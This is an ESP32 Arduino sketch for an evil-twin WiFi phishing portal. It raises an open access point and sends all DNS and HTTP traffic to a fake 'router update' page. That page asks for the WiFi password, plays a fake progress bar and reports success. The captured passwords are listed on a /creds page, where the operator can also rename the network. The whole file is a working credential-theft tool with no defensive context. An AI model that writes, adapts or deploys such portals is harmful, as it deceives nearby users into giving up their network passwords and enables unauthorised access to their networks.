#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <LittleFS.h>

// ================= KONFIGURACJA =================
const String SUBTITLE = "Router Update";
const String TITLE = "Network software update required";
const String BODY = "To complete the update process, enter your WiFi password";
const String POST_TITLE = "System update in progress...";
const String POST_BODY = "Please do not interrupt the process - it may take a few minutes...";
const String PASS_TITLE = "/LOGS/";
const String CLEAR_TITLE = "Clear logs";
const String CONFIG_TITLE = "System configuration";

// =============== NAZWA AP ================
String currentSSID = "Evil_Service";
const String defaultSSID = "EvilUpdate";
const byte DNS_PORT = 53;
IPAddress APIP(172, 0, 0, 1);

// ================= ZMIENNE =================
DNSServer dnsServer;
WebServer webServer(80);

String data = "", Credentials = "";
int savedData = 0;

// ================== HTML ===================
String header(String t) {
  String CSS = "body{font-family:'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;"
               "background:#121212;color:#e0e0e0;margin:0;padding:0;min-height:100vh;}"
               "nav{background:linear-gradient(135deg,#0062ff,#2b83f6);color:white;"
               "padding:1.5em;border-radius:0 0 20px 20px;box-shadow:0 4px 12px rgba(0,0,0,0.2);}"
               "nav b{display:block;font-size:1.5em;font-weight:600;margin-bottom:0.3em;}"
               ".container{max-width:600px;margin:2em auto;padding:0 1em;}"
               ".card{background:#1e1e1e;border-radius:12px;padding:2em;margin-bottom:1.5em;"
               "box-shadow:0 8px 16px rgba(0,0,0,0.2);border:1px solid #333;}"
               "h1{color:#fff;margin-top:0;font-weight:500;}"
               "p{color:#b0b0b0;line-height:1.6;}"
               "input{width:100%;padding:14px;margin:10px 0;border-radius:8px;border:none;"
               "background:#2d2d2d;color:#fff;font-size:16px;box-sizing:border-box;"
               "transition:all 0.3s ease;border:1px solid #333;}"
               "input:focus{outline:none;border-color:#0062ff;background:#333;}"
               "button{width:100%;padding:14px;margin:10px 0;border-radius:8px;border:none;"
               "background:linear-gradient(135deg,#0062ff,#2b83f6);color:white;font-size:16px;"
               "font-weight:500;cursor:pointer;transition:all 0.3s ease;box-shadow:0 4px 8px rgba(0,0,0,0.2);}"
               "button:hover{transform:translateY(-2px);box-shadow:0 6px 12px rgba(0,0,0,0.3);}"
               "button:active{transform:translateY(0);}"
               ".progress-container{width:100%;background:#2d2d2d;border-radius:8px;margin:2em 0;}"
               ".progress-bar{width:0%;height:24px;background:linear-gradient(135deg,#00c853,#5efc82);"
               "border-radius:8px;transition:width 0.5s ease;display:flex;align-items:center;"
               "justify-content:center;color:#000;font-weight:500;}"
               "ol{padding-left:1.5em;}"
               "li{margin-bottom:0.8em;color:#b0b0b0;}"
               "a{color:#2b83f6;text-decoration:none;transition:color 0.2s ease;}"
               "a:hover{color:#5da8ff;}"
               ".success-badge{background:linear-gradient(135deg,#00c853,#5efc82);color:#000;"
               "padding:0.5em 1em;border-radius:20px;font-weight:600;display:inline-block;"
               "margin-bottom:1em;box-shadow:0 4px 8px rgba(0,200,83,0.3);}";

  return "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name=viewport content='width=device-width, initial-scale=1'>"
         "<title>" + currentSSID + " :: " + t + "</title><style>" + CSS + "</style>"
         "</head><body><nav><b>" + currentSSID + "</b>" + SUBTITLE + "</nav>"
         "<div class=container><div class=card>";
}

String footer() {
  return "</div></div><div style='text-align:center;padding:2em 0;color:#666;font-size:0.9em;'>"
         "&copy; Router - update v2.3.5</div></body></html>";
}

String input(String arg) {
  String v = webServer.arg(arg);
  v.replace("<", "&lt;");
  v.replace(">", "&gt;");
  return v.substring(0, 200);
}

// ================== STRONY =================
String index() {
  return header(TITLE) + 
    "<h1>" + TITLE + "</h1>"
    "<p>" + BODY + "</p>"
    "<form action='/post' method='post'>"
    "<input type=password name=password placeholder='Enter WiFi password' required>"
    "<button type=submit>Start update</button>"
    "</form>" + footer();
}

String posted() {
  String password = input("password");
  Credentials = "<li><b>WiFi password:</b> " + password + "</li>";

  String progress = "<h1>" + POST_TITLE + "</h1>"
                   "<p>" + POST_BODY + "</p>"
                   "<div class=progress-container>"
                   "<div class=progress-bar id=progress>0%</div></div>"
                   "<script>"
                   "var i=0;var progress=setInterval(function(){"
                   "i++;document.getElementById('progress').style.width=i+'%';"
                   "document.getElementById('progress').innerHTML=i+'%';"
                   "if(i>=100){clearInterval(progress);setTimeout(function(){"
                   "window.location.href='/success';},500);}"
                   "},50);"
                   "</script>";

  return header(POST_TITLE) + progress + footer();
}

String success() {
  return header("Update completed") + 
    "<div class=success-badge>UPDATE SUCCESSFULLY COMPLETED</div>"
    "<h1>Your router has been updated</h1>"
    "<p>Your system has been successfully updated to the latest version.</p>"
    + footer();
}

String creds() {
  return header(PASS_TITLE) + 
    "<h1>" + PASS_TITLE + "</h1>"
    "<ol>" + Credentials + "</ol><br>"

    "<h2>Change network name(AP)</h2>"
    "<form action='/updateconfig' method='post'>"
    "<input name='ssid' value='" + currentSSID + "' placeholder='Network name (SSID)' required>"
    "<button type='submit'>save</button></form>"

    "<form action='/clear' method='post'>"
    "<button type='submit'>clear</button></form>"

    "<p style='text-align:center;margin-top:1.5em;'>"
    "<a href='/'>back</a></p>" + footer();
}

String updateConfig() {
  String newSSID = input("ssid");
  if (newSSID.length() > 0 && newSSID.length() < 32) {
    currentSSID = newSSID;
    WiFi.softAP(currentSSID.c_str());
    return header(CONFIG_TITLE) + 
      "<h1>" + CONFIG_TITLE + "</h1>"
      "<p>The network name (SSID) has been changed to: <b>" + currentSSID + "</b></p>"
      "<p style='text-align:center;'><a href='/'>Back to home page</a></p>"
      + footer();
  }
  return header(CONFIG_TITLE) + 
    "<h1>" + CONFIG_TITLE + "</h1>"
    "<p style='color:#ff6b6b;'>Error: Network name must be between 1 and 32 characters long.</p>"
    "<p style='text-align:center;'><a href='/creds'>Try again</a></p>"
    + footer();
}

String clearData() {
  currentSSID = defaultSSID;
  Credentials = "";
  WiFi.softAP(currentSSID.c_str());
  return header(CLEAR_TITLE) +
    "<h1>Data cleared</h1>"
    "<p>All data has been deleted. Network name restored to default: <b>" + currentSSID + "</b></p>"
    "<p style='text-align:center;'><a href='/'>Back</a></p>"
    + footer();
}

// ================== START ==================
void setup() {
  delay(1000);
  Serial.begin(115200);
  Serial.println("\nInicjalizacja systemu...");

  if(!LittleFS.begin(true)) {
    Serial.println("Błąd inicjalizacji LittleFS!");
  } else {
    Serial.println("LittleFS zainicjalizowany");
  }

  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(currentSSID.c_str());
  Serial.println("AP utworzone: " + currentSSID);
  Serial.println("IP: " + APIP.toString());

  dnsServer.start(DNS_PORT, "*", APIP);

  webServer.onNotFound([]() {
    webServer.sendHeader("Location", String("http://") + APIP.toString(), true);
    webServer.send(302, "text/plain", "");
  });

  webServer.on("/", []() { webServer.send(200, "text/html", index()); });
  webServer.on("/post", []() { webServer.send(200, "text/html", posted()); });
  webServer.on("/success", []() { webServer.send(200, "text/html", success()); });
  webServer.on("/creds", []() { webServer.send(200, "text/html", creds()); });
  webServer.on("/updateconfig", []() { webServer.send(200, "text/html", updateConfig()); });
  webServer.on("/clear", []() { webServer.send(200, "text/html", clearData()); });

  // Captive Portal dla różnych systemów
  webServer.on("/generate_204", []() { webServer.sendHeader("Location", "/", true); webServer.send(302, "text/plain", ""); });

  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
